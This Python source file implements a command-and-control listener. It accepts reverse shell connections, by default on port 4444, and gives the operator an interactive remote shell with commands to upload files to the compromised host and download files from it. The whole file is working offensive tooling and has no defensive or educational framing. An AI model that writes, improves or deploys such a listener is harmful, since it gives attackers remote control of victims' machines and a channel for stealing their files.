#!/usr/bin/env python3
import base64
import json
import socket
import sys
from core.banner import info, success, warn, error, highlight, CYAN, GREEN, RESET, BRIGHT

class C2Listener:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = None
        self.address = None

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.ip, self.port))
        server.listen(1)
        info(f'Listener waiting for incoming reverse shell connection on {self.ip}:{self.port}...')
        try:
            self.connection, self.address = server.accept()
            success(f'Connection established from {self.address[0]}:{self.address[1]}')
            self.interact()
        except KeyboardInterrupt:
            warn('\nListener terminated by operator.')
        finally:
            server.close()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        if hasattr(json_data, 'encode'):
            json_data = json_data.encode('utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    return None
                json_data += chunk
                return json.loads(json_data.decode('utf-8'))
            except (ValueError, UnicodeDecodeError):
                continue

    def execute_remotely(self, command_tokens):
        self.reliable_send(command_tokens)
        if command_tokens[0] == 'exit':
            self.connection.close()
            info('Connection closed.')
            sys.exit(0)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content))
        return f'[+] Downloaded remote file successfully to: {path}'

    def read_file(self, path):
        with open(path, 'rb') as f:
            encoded = base64.b64encode(f.read())
            if hasattr(encoded, 'decode'):
                encoded = encoded.decode('utf-8')
            return encoded

    def interact(self):
        info('Remote shell interactive session ready. Available commands:')
        info('  upload <local_path>   : Send file to remote host')
        info('  download <remote_path>: Retrieve file from remote host')
        info('  cd <path>             : Change remote working directory')
        info('  exit                  : Terminate remote agent and listener')
        print('-' * 65)
        while True:
            try:
                cmd_line = input(f'{CYAN}shell@{self.address[0]}{RESET} > ').strip()
                if not cmd_line:
                    continue
                tokens = cmd_line.split(' ')
                if tokens[0] == 'upload':
                    if len(tokens) < 2:
                        error('Usage: upload <local_filename>')
                        continue
                    try:
                        file_data = self.read_file(tokens[1])
                        tokens.append(file_data)
                    except Exception as e:
                        error(f"Cannot read local file '{tokens[1]}': {e}")
                        continue
                result = self.execute_remotely(tokens)
                if result is None:
                    error('Remote host disconnected.')
                    break
                if tokens[0] == 'download' and '[-] Error' not in str(result):
                    if len(tokens) >= 2:
                        try:
                            result = self.write_file(tokens[1], result)
                        except Exception as e:
                            result = f'[-] Could not save file locally: {e}'
                print(result)
            except KeyboardInterrupt:
                print('')
                confirm = input('Terminate session? (y/N): ').strip().lower()
                if confirm == 'y':
                    self.execute_remotely(['exit'])
                    break
            except Exception as e:
                error(f'Session error: {e}')

def run(args):
    ip = args.ip or '0.0.0.0'
    port = args.port or 4444
    listener = C2Listener(ip, port)
    listener.start()
    return 0
